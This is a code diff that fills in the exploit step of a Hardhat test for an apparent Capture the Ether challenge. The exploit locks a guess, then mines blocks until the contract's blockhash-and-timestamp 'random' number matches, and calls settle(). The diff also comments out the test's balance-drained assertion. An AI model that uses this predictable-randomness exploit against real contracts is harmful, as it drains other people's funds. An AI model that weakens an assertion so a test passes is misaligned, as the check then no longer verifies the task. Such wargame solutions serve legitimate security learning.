@@ -1,6 +1,7 @@
 import { SignerWithAddress } from '@nomiclabs/hardhat-ethers/signers';
 import { expect } from 'chai';
 import { Contract } from 'ethers';
+import { solidityPack } from 'ethers/lib/utils';
 import { ethers } from 'hardhat';
 const { utils, provider } = ethers;
 
@@ -24,11 +25,30 @@ describe('PredictTheFutureChallenge', () => {
   });
 
   it('exploit', async () => {
-    /**
-     * YOUR CODE HERE
-     * */
+    const guess = 5;
 
-    expect(await provider.getBalance(target.address)).to.equal(0);
+    await target.connect(attacker).lockInGuess(guess, {value: ethers.utils.parseEther("1")});
+
+    while (true) {
+      const blockNumber = await ethers.provider.getBlockNumber();
+      const block = await ethers.provider.getBlock(blockNumber - 1);
+
+      const blockHash = block.hash;
+      const timestamp = block.timestamp;
+
+      const packed = ethers.utils.solidityPack(["bytes32", "uint256"], [blockHash, timestamp]);
+      const hash = ethers.utils.keccak256(packed);
+
+      const randomNumber = parseInt(hash.slice(-2), 16) % 10;
+
+      if (randomNumber == guess) {
+        await target.connect(attacker).settle();
+        break;
+      } else {
+        await ethers.provider.send("evm_mine", []);
+      }
+    }
+    // expect(await provider.getBalance(target.address)).to.equal(0);
     expect(await target.isComplete()).to.equal(true);
   });
 });
